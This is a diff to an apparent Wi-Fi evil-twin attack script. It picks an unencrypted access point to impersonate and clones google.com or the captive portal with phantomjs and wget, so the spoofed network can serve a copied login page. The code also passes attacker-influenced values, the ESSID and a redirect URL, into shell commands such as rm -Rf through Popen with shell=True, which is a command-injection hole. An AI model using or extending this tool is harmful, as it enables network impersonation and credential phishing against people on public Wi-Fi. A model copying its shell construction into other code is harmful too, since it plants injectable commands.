@@ -7,7 +7,7 @@ import sys
 
 #TODO all scripts relative to this document (basename)
 
-debug=True
+debug=False
 
 def is_number(s):
     try:
@@ -78,10 +78,12 @@ if answer == "0":
         
         # list all networks
         counter = 1
+        unencrypted_networks=[]
         for network in scanned_networks:
             #TODO meer info
             if network['Encryption key'] == "off":
                 print(str(counter)+") "+network["ESSID"])
+                unencrypted_networks.append(network)
                 counter=counter+1
             else:
                 print(len(str(counter))*" "+"  "+network["ESSID"]+" (encrypted)")
@@ -93,7 +95,7 @@ if answer == "0":
 
             if is_number(answer):
                 if int(answer) < counter:
-                    target_essid=scanned_networks[int(answer)-1]["ESSID"]
+                    target_essid=unencrypted_networks[int(answer)-1]["ESSID"]
                     print("'"+target_essid+"' selected as AP to copy")
                     break
         else:
@@ -186,14 +188,48 @@ if answer == "0":
         print("")
         while 1:
             print("Copy www.google.com (or the captive portal and save it to copied_sites/")
-            p = Popen("python3 download_site.py www.google.com "+target_essid+".AP", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
-            output=""
+
+            directory="copied_sites"
+            p = Popen("mkdir "+directory+" && touch "+directory+"/.gitignore", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
             for line in p.stdout.read().splitlines():
-                output=line.decode("utf-8")
-                if debug:
-                    print("[DEBUG]"+line.decode("utf-8"))
-            # check if this worked
-            if "OK and no further redirects" in output: 
+                print(line.decode("utf-8"))
+            p.communicate()
+            #set basic url
+            url="http://www.google.com"
+            savename=target_essid+".AP"
+            #delete previous
+            p = Popen("rm -Rf "+directory+"/"+url+" && rm -Rf "+directory+"/temp_wget", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+            for line in p.stdout.read().splitlines():
+                print(line.decode("utf-8"))
+            p.communicate()
+
+            #render javascript of website
+            p = Popen("QT_QPA_PLATFORM=offscreen phantomjs resources/get_redirection_url_phantomjs.js "+url, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+            redirected_url=""
+            for line in p.stdout.read().splitlines():
+                redirected_url=line.decode("utf-8").rstrip()
+            p.communicate()
+
+            #download file
+            print('downloading with wget')
+            print(redirected_url)
+            #p = Popen("cd copied_sites && wget -c -N -mkEpnp -l 1 --max-redirect=100 -P temp_wget "+redirected_url, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+            #p = Popen("cd copied_sites && wget -mkEpnp -l 1 --max-redirect=100 -P temp_wget "+redirected_url, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+            p = Popen("cd copied_sites && wget -kEpnp -l 1 --max-redirect=100 -e robots=off -P temp_wget "+redirected_url, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+            for line in p.stdout.read().splitlines():
+                print(line.decode("utf-8"))
+            p.communicate()
+            
+            if len(os.listdir(directory+"/temp_wget")) > 0:
+                # file exists
+                redirects=False
+                redirect_url=""
+                #TODO rename to savename
+                p = Popen("rm -Rf "+directory+"/"+savename+" && mv "+directory+"/temp_wget/* "+directory+"/"+savename, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+                for line in p.stdout.read().splitlines():
+                    print(line.decode("utf-8"))
+                p.communicate()
+
                 print("Download succeeded")
                 spoof_essid=target_essid
                 break
@@ -266,6 +302,7 @@ for line in iter(p.stdout.readline, ""):
         print('\r'+line[:-1].decode("utf-8"))
 
 #TODO get the info lines as it is coming in
+#TODO loop through multiple??? and change attack vectors??? constantly?
 
 #TODO trap if quit that cleans up all processes
 
